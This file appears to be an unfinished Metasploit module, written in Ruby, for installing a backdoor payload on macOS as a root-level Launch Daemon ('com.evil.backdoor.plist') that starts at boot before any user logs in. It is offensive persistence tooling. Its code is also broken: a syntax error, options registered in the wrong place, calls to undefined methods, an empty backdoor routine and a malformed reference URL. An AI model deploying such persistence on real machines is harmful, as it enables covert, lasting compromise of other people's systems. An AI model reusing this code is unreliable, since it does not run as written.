##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
	include Msf::Post::File

	# TODO set payload option, figure out ways to generate payloads

	def initialize(info = {})
		super(
			update_info(
				info, 
				'Name' => 'OSX Launch Daemon Payload Installer',
				'Description' => %q{
					This module provides persistence by installing a payload
					as a Launch Daemon into the /Library/LaunchDaemons/ Directory.
					The payload will be launched before user login at system initialization.
					Unlike Launch Agents the Daemon operates outside of the context 
					of the users session at the system level. 
				},
				'License' => MSF_LICENSE,
				'References'  => [
					# OSX Malware Persistence, thanks Patrick
          			[ 'URL', 'https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf' ],
          			# Apples official Launch Agent & Launch Daemon docs
          			['URL', 'https://https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html']
         		],
        		'Author' =>  "gardnerapp AKA MewSashi",
        		'Targets' => "OSX", #TODO validate on ARM and x86
        		'SessionTypes' => [ 'shell', 'meterpreter' ]
			)
		)
	end 

	register_options([
		OpString,.new("BACKDOOR_PATH",[
			false, "Path to the backdoor, will be set to /Users/Shared/ as default ", "/Users/Shared/"]),
		OptString.new("DAEMON_FILE",[
			true, 'Name of launch daemon plist',
			'com.evil.backdoor.plist'
		]),
		OptBool.new("KEEP_ALIVE",[
			true, 'When set to true this will ensure that the Launch Daemon is running at all times.', true
		]), 
		OptBool.new('RUN_NOW',[
			false, 'Run the installed payload immediately.', false
		]),
		# TODO add file formatting for the Launch Daemon
		#OptInt.new('FORMAT',[
		#	false, 'The file format for the Launch Daemon file 0 -> XML, 1 -> JSON, 2 -> Binary', 0
		#])

	])

	def exploit
		check_duplicate_daemon

		write_backdoor
	end 

	# raises an error if the launch daemon file already exists
	def check_duplicate_daemon
		fail_with('FileError', "A Launch Daemon #{daemon_path} already exists." ) if file?(daemon_path)
	end 

	# Full path to Launch Daemon 
	def daemon
		@daemon_path = "/Library/LaunchDaemons/#{daemon_file}"
	end 

	# ensures user didn't forget the .plist extension
	def daemon_file
		if datastore['DAEMON_FILE'].ends_with?(".plist")
			@daemon_file = datastore['DAEMON_FILE'] 
		else 
			@daemon_path = datastore['DAEMON_FILE'].concat(".plist")
		end 
		@daemon_file
	end

	def backdoor
	end 

	# formats the Launch Daemon file with the options selected by the user
	#def format_file
	#	case datastore['FORMAT']
	#	when 0 #  XML
	#		puts ''
	#	when 1 # JSON
	#		puts ''
	#	when 2 # Binary
	#		puts ''
	#	else # invalid input 
	#		fail_with Failure::BadConfig, "Invalid option #{datastore['FORMAT']} for FORMAT. Please select 0, 1 or 2"
	#	end 
	# end 

end 